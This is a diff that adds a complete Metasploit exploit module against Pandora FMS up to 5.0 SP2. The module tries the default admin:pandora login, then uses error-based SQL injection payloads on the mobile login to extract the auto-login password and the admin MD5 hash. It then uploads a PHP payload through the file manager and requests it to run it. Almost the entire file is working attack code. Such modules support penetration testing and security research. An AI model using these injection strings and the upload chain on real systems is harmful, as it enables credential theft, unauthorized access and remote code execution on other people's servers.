@@ -1,0 +1,317 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => 'Pandora FMS SQLi Remote Code Execution',
+      'Description'    => %q{
+        This module attempts to exploit multiple issues in order to gain remote
+        code execution under Pandora FMS version <= 5.0 SP2.  First, an attempt
+        to authenticate using default credentials is performed.  If this method
+        fails, a SQL injection vulnerability is leveraged in order to extract
+        the "Auto Login" password hash.  If this value is not set, the module
+        will then extract the administrator account's MD5 password hash.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Lincoln <Lincoln[at]corelan.be>', # Discovery, Original Proof of Concept
+          'Jason Kratzer <pyoor[at]corelan.be>' # Metasploit Module
+        ],
+      'References'     =>
+        [
+          ['URL', 'http://pandorafms.com/downloads/whats_new_5-SP3.pdf'],
+          ['URL', 'http://blog.pandorafms.org/?p=2041']
+        ],
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Targets'        =>
+        [
+          ['Pandora FMS version <= 5.0 SP2', {}]
+        ],
+      'Privileged'     => false,
+      'Payload'        =>
+        {
+          'Space'       => 50000,
+          'DisableNops' => true,
+        },
+      'DisclosureDate' => "Feb 1 2014",
+      'DefaultTarget'  => 0))
+
+      register_options(
+        [
+          OptString.new('TARGETURI', [true, 'The URI of the vulnerable Pandora FMS instance', '/pandora_console/']),
+          OptString.new('USER', [false, 'The username to authenticate with', 'admin']),
+          OptString.new('PASS', [false, 'The password to authenticate with', 'pandora']),
+        ], self.class)
+  end
+
+  def uri
+    target_uri.path
+  end
+
+
+  def check
+    vprint_status("#{peer} - Trying to detect installed version")
+
+    version = nil
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => normalize_uri(uri, 'index.php')
+    })
+
+    if res && res.code == 200 && res.body =~ /Pandora FMS - the Flexible Monitoring System/
+      if res.body =~ /<div id="ver_num">v(.*?)<\/div>/
+        version = $1
+      else
+        return Exploit::CheckCode::Detected
+      end
+    end
+
+    unless version.nil?
+      vprint_status("#{peer} - Pandora FMS #{version} found")
+      if Gem::Version.new(version) <= Gem::Version.new('5.0SP2')
+        return Exploit::CheckCode::Appears
+      end
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+
+  # Attempt to login with credentials (default admin:pandora)
+  def authenticate
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(uri, 'index.php'),
+      'vars_get' => {
+        'login' => "1",
+      },
+      'vars_post' => {
+        'nick' => datastore['USER'],
+        'pass' => datastore['PASS'],
+        'Login' => 'Login',
+      }
+    })
+
+    return auth_succeeded?(res)
+  end
+
+  # Attempt to login with auto login and SQLi
+  def login_hash
+    clue = rand_text_alpha(8)
+    sql_clue = clue.each_byte.map { |b| b.to_s(16) }.join
+    # select value from tconfig where token = 'loginhash_pwd';
+    sqli = "1' AND (SELECT 2243 FROM(SELECT COUNT(*),CONCAT(0x#{sql_clue},(SELECT MID((IFNULL(CAST"
+    sqli << "(value AS CHAR),0x20)),1,50) FROM tconfig WHERE token = 0x6c6f67696e686173685f707764 "
+    sqli << "LIMIT 0,1),0x#{sql_clue},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP "
+    sqli << "BY x)a) AND 'msf'='msf"
+
+    password = inject_sql(sqli, clue)
+
+    if password && password.length != 0
+      print_status("#{peer} - Extracted auto login password (#{password})")
+    else
+      print_error("#{peer} - No auto login password has been defined!")
+      return false
+    end
+
+    print_status("#{peer} - Attempting to authenticate using (admin:#{password})")
+    # Attempt to login using login hash password
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(uri, 'index.php'),
+      'vars_get' => {
+        'loginhash' => 'auto',
+      },
+      'vars_post' => {
+        'loginhash_data' => Rex::Text.md5("admin#{password}"),
+        'loginhash_user' => 'admin',
+      }
+    })
+
+    return auth_succeeded?(res)
+  end
+
+
+  def auth_succeeded?(res)
+    if res && res.code == 200 && res.body.include?('Welcome to Pandora FMS')
+      print_status("#{peer} - Successfully authenticated!")
+      print_status("#{peer} - Attempting to retrieve session cookie")
+      @cookie = res.get_cookies
+      if @cookie.include?('PHPSESSID')
+        print_status("#{peer} - Successfully retrieved session cookie: #{@cookie}")
+        return true
+      else
+        print_error("#{peer} - Error retrieving cookie!")
+      end
+    else
+      print_error("#{peer} - Authentication failed!")
+    end
+
+    false
+  end
+
+
+  def extract
+    # Generate random string and convert to hex
+    clue = rand_text_alpha(8)
+    hex_clue = clue.each_byte.map { |b| b.to_s(16) }.join
+
+    # select password from tusuario where id_user = 0;
+    sqli = "test' AND (SELECT 5612 FROM(SELECT COUNT(*),CONCAT(0x#{hex_clue},(SELECT MID((IFNULL"
+    sqli << "(CAST(password AS CHAR),0x20)),1,50) FROM tusuario WHERE id_user = 0 LIMIT 0,1)"
+    sqli << ",0x#{hex_clue},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY "
+    sqli << "x)a) AND 'msf'='msf"
+
+    password = inject_sql(sqli, clue)
+
+    if password && password.length != 0
+      print_good("#{peer} - Extracted admin password hash, unsalted md5 - [ #{password} ]")
+    else
+      print_error("#{peer} - Unable to extract password hash!")
+      return false
+    end
+  end
+
+
+  def inject_sql(sql, fence_post)
+    # Extract password hash from database
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(uri, 'mobile', 'index.php'),
+      'vars_post' => {
+        'action' => 'login',
+        'user' => sql,
+        'password' => 'pass',
+        'input' => 'Login'
+      }
+    })
+
+    result = nil
+    if res && res.code == 200
+      match = res.body.match(/(?<=#{fence_post})(.*)(?=#{fence_post})/)
+      if match
+        result = match[1]
+      else
+        print_error("#{peer} - SQL injection failed")
+      end
+    end
+    result
+  end
+
+  def upload
+    # Extract hash and hash2 from response
+    res = send_request_cgi({
+      'method' => 'GET',
+      'cookie' => @cookie,
+      'uri'    => normalize_uri(uri, 'index.php'),
+      'vars_get' => {
+        'sec' => 'gsetup',
+        'sec2' => 'godmode/setup/file_manager'
+      }
+    })
+
+    if res && res.code == 200 && res.body =~ /(?<=input type="submit" id="submit-go")(.*)(?=<input id="hidden-directory" name="directory" type="hidden")/
+      form = $1
+
+      # Extract hash
+      if form =~ /(?<=name="hash" type="hidden"  value=")(.*?)(?=" \/>)/
+        hash = $1
+      else
+        print_error("#{peer} - Could not extract hash from response!")
+        fail_with(Failure::Unknown, "#{peer} - Unable to inject payload!")
+      end
+
+      # Extract hash2
+      if form =~ /(?<=name="hash2" type="hidden"  value=")(.*?)(?=" \/>)/
+        hash2 = $1
+      else
+        print_error("#{peer} - Could not extract hash2 from response!")
+        fail_with(Failure::Unknown, "#{peer} - Unable to inject payload!")
+      end
+
+      # Extract real_directory
+      if form =~ /(?<=name="real_directory" type="hidden"  value=")(.*?)(" \/>)/
+        real_directory = $1
+      else
+        print_error("#{peer} - Could not extract real_directory from response!")
+        fail_with(Failure::Unknown, "#{peer} - Unable to inject payload!")
+      end
+    else
+      print_error("#{peer} - Could not identify upload form!")
+      fail_with(Failure::Unknown, "#{peer} - Unable to inject payload!")
+    end
+
+
+    # Upload script
+    @payload_name = "#{rand_text_alpha(8)}.php"
+    post_data = Rex::MIME::Message.new
+    post_data.add_part("<?php #{payload.encoded} ?>", 'text/plain', nil, %Q^form-data; name="file"; filename="#{@payload_name}"^)
+    post_data.add_part('', nil, nil, 'form-data; name="unmask"')
+    post_data.add_part('Go', nil, nil, 'form-data; name="go"')
+    post_data.add_part(real_directory, nil, nil, 'form-data; name="real_directory"')
+    post_data.add_part('images', nil, nil, 'form-data; name="directory"')
+    post_data.add_part("#{hash}", nil, nil, 'form-data; name="hash"')
+    post_data.add_part("#{hash2}", nil, nil, 'form-data; name="hash2"')
+    post_data.add_part('1', nil, nil, 'form-data; name="upload_file_or_zip"')
+
+    print_status("#{peer} - Attempting to upload payload #{@payload_name}...")
+    res = send_request_cgi({
+      'method' => 'POST',
+      'cookie' => @cookie,
+      'uri'    => normalize_uri(uri, 'index.php'),
+      'ctype'   => "multipart/form-data; boundary=#{post_data.bound}",
+      'data' => post_data.to_s,
+      'vars_get' => {
+        'sec' => 'gsetup',
+        'sec2' => 'godmode/setup/file_manager'
+      }
+    })
+
+    if res && res.code == 200 && res.body.include?("Upload correct")
+      register_file_for_cleanup(@payload_name)
+      print_status("#{peer} - Successfully uploaded payload")
+    else
+      fail_with(Failure::Unknown, "#{peer} - Unable to inject payload!")
+    end
+  end
+
+
+  def exploit
+    # First try to authenticate using default or user-supplied credentials
+    print_status("#{peer} - Attempting to authenticate using (#{datastore['USER']}:#{datastore['PASS']})")
+    auth = authenticate
+
+    unless auth
+      print_status("#{peer} - Attempting to extract auto login hash via SQLi")
+      auth = login_hash
+    end
+
+    unless auth
+      print_status("#{peer} - Attempting to extract admin password hash with SQLi")
+      extract
+      fail_with(Failure::NoAccess, "#{peer} - Unable to perform remote code execution!")
+    end
+
+    print_status("#{peer} - Uploading PHP payload...")
+    upload
+
+    print_status("#{peer} - Executing payload...")
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => normalize_uri(uri, 'images', @payload_name),
+      'cookie' => @cookie
+    }, 1)
+  end
+end
